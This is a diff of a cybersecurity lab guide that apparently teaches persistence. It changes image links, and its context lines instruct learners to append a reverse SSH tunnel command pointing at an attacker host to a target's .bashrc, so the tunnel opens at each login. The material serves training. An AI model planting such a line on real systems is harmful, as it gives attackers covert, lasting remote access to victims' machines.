@@ -20,12 +20,12 @@ You'll set up an ingenious trap, one that will automatically establish an SSH co
 # Learner Instructions
 1. Select the machine representing the Attacker. Opening the terminal, enter the following command: **`ssh-keygen -t rsa`** . This command generates an RSA public-private key pair which will be used to unlock the target machine.
 
-![image](https://user-images.githubusercontent.com/20422508/221713813-dfdf3c7a-8f54-4277-a7a1-00c7dc867b37.png)
+![image](https://user-images.githubusercontent.com/20422508/221713932-954e8bc9-6df9-4490-887c-b6555d63af0a.png)
 
 3. Using the following command, copy the public key to the target machine: **`ssh-copy-id <username>@<target_machine_IP>`**. 
 4. Keep in mind that you will need to replace **`<username>`** with the correct target username and **`<target_machine_IP>`** with IP address of the target. Do not enter a passphrase when asked to do so.
 
-![image](https://user-images.githubusercontent.com/20422508/221691558-0a1ac821-9825-4c39-8044-f51747afac2c.png)
+![image](https://user-images.githubusercontent.com/20422508/221714190-e1289142-974e-4180-afcc-82f301687ebf.png)
 
 6. On the target machine, open the user's bashrc file by executing the command: **`nano ~/.bashrc`**. This command will open the nano text editor and display the contents of the bashrc file, providing the opportunity to plant the reverse shell.
 7. Append the following line to the end of the file: **`ssh -f -N -R 2222:localhost:22 <username>@<attacker_machine_IP>`**. Replace **`<username>`** with the username of the user account on the attacker machine and **`<attacker_machine_IP>`** with the IP address of the attacker machine. This command performs the following:
@@ -36,7 +36,7 @@ You'll set up an ingenious trap, one that will automatically establish an SSH co
 - **2222** is the remote port that will forwarded to the local machine
 - **localhost:22** is the localhost and port that traffic will be forwarded to via the established tunnel
 
-![image](https://user-images.githubusercontent.com/20422508/221692243-59e4cf9c-f335-45e7-8ea8-66b522865ee0.png)
+![image](https://user-images.githubusercontent.com/20422508/221714225-329352dc-974b-4b41-8f63-c9ee179c75c5.png)
 
 9. Save and close the bashrc file by executing **`Ctrl + X`**, then **`Y`**, then **`Enter`**, saving the file.
 10. Logout and login again or execute the command **`source ~/.bashrc`**, activating the reverse shell.
